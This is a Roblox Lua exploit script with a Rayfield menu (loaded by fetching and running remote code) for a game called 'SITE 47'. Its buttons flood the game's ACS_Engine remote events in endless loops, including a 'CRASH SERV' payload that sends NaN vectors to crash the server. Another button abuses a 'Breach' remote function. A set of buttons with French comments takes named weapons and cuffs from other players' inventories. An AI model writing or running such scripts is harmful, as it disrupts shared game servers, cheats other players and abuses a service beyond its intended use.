local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "SITE 47",
    Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "EZ",
    LoadingSubtitle = "by WAXSCP",
    Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes
 
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
 
    ConfigurationSaving = {
       Enabled = true,
       FolderName = nil, -- Create a custom folder for your hub/game
       FileName = "Big Hub"
    },
 
    Discord = {
       Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
       Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },
 
    KeySystem = false, -- Set this to true to use our key system
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
       Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
       FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
       Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })
 local Tab = Window:CreateTab("EXPLOIT ", 4483362458) -- Title, Image
 local Button = Tab:CreateButton({
    Name = "WHIZZ ",
    Callback = function()while task.wait() do

        for _, player in next, game.Players:GetPlayers() do
            game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Whizz:FireServer(player)
        end
     end
    -- The function that takes place when the button is pressed
    end,
 })
 local Button = Tab:CreateButton({
    Name = "CRASH SERV SPAM CA ! ",
    Callback = function()while task.wait() do

        for i = 1, 30 do
            game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.ServerBullet:FireServer(Vector3.new(0/0/0),Vector3.new(0/0/0))
        end
     end
    -- The function that takes place when the button is pressed
    end,
 })
 local Button = Tab:CreateButton({
    Name = "Test mdr ",
    Callback = function()--// by vish (https://v3rmillion.net/member.php?action=profile&uid=2778784)

        --// Target
        local target = game:GetService('Players').LocalPlayer -- localplayer as default
        
        --// CFrame
        local cFrame = CFrame.new(0,0,0)
        
        --// Size
        local Size = {
           X = 10,
           Y = 100,
           Z = 10000
        }
        
        --// Build
        for _,v in next, game.ReplicatedStorage:GetDescendants() do
           if v.Name == 'Breach' and v:IsA('RemoteFunction') then
               v:InvokeServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=target.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})
           end
        end
    -- The function that takes place when the button is pressed
    end,
 })
 local Tab = Window:CreateTab("Give arme ", 4483362458) -- Title, Image
 local Button = Tab:CreateButton({
    Name = "USP ",
    Callback = function()local weaponName = "USP" -- Nom de l'arme à voler
        local stolen = false -- Permet d'arrêter après avoir volé une arme
        
        for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer and not stolen then
                local inventory = player:FindFirstChild("Backpack")
                if inventory then
                    for _, item in pairs(inventory:GetChildren()) do
                        if item.Name == weaponName then
                            item.Parent = game.Players.LocalPlayer.Backpack -- Vol d'arme
                            print("🔥 USP volée à " .. player.Name .. " !")
                            stolen = true -- On arrête après le premier vol
                            break
                        end
                    end
                end
            end
        end
        
        if not stolen then
            print("❌ Aucun USP trouvé dans les inventaires.")
        end
        
    -- The function that takes place when the button is pressed
    end,
 })local Button = Tab:CreateButton({
    Name = "MP 5",
    Callback = function()local weaponName = "MP5" -- Nom de l'arme à voler
        local stolen = false -- Permet d'arrêter après avoir volé une arme
        
        for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer and not stolen then
                local inventory = player:FindFirstChild("Backpack")
                if inventory then
                    for _, item in pairs(inventory:GetChildren()) do
                        if item.Name == weaponName then
                            item.Parent = game.Players.LocalPlayer.Backpack -- Vol d'arme
                            print("🔥 MP5 volée à " .. player.Name .. " !")
                            stolen = true -- On arrête après le premier vol
                            break
                        end
                    end
                end
            end
        end
        
        if not stolen then
            print("❌ Aucun MP5 trouvé dans les inventaires.")
        end
        
    -- The function that takes place when the button is pressed
    end,
 })
 local Button = Tab:CreateButton({
    Name = "Lvl-REDACTED ",
    Callback = function()local weaponName = "Lvl-REDACTED" -- Nom de l'arme à voler
        local stolen = false -- Permet d'arrêter après avoir volé une arme
        
        for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer and not stolen then
                local inventory = player:FindFirstChild("Backpack")
                if inventory then
                    for _, item in pairs(inventory:GetChildren()) do
                        if item.Name == weaponName then
                            item.Parent = game.Players.LocalPlayer.Backpack -- Vol d'arme
                            print("🔥 Lvl-REDACTED volée à " .. player.Name .. " !")
                            stolen = true -- On arrête après le premier vol
                            break
                        end
                    end
                end
            end
        end
        
        if not stolen then
            print("❌ Aucun Lvl-REDACTED trouvé dans les inventaires.")
        end
        
    -- The function that takes place when the button is pressed
    end,
 })
 local Button = Tab:CreateButton({
    Name = "CUFFS ",
    Callback = function()local weaponName = "Cuffs [Drag]" -- Nom de l'arme à voler
        local stolen = false -- Permet d'arrêter après avoir volé une arme
        
        for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer and not stolen then
                local inventory = player:FindFirstChild("Backpack")
                if inventory then
                    for _, item in pairs(inventory:GetChildren()) do
                        if item.Name == weaponName then
                            item.Parent = game.Players.LocalPlayer.Backpack -- Vol d'arme
                            print("🔥 Cuffs [Drag] volée à " .. player.Name .. " !")
                            stolen = true -- On arrête après le premier vol
                            break
                        end
                    end
                end
            end
        end
        
        if not stolen then
            print("❌ Aucun Cuffs [Drag] trouvé dans les inventaires.")
        end
        
    -- The function that takes place when the button is pressed
    end,
 })
 local Tab = Window:CreateTab("SOON BRO ! ", 4483362458) -- Title, Image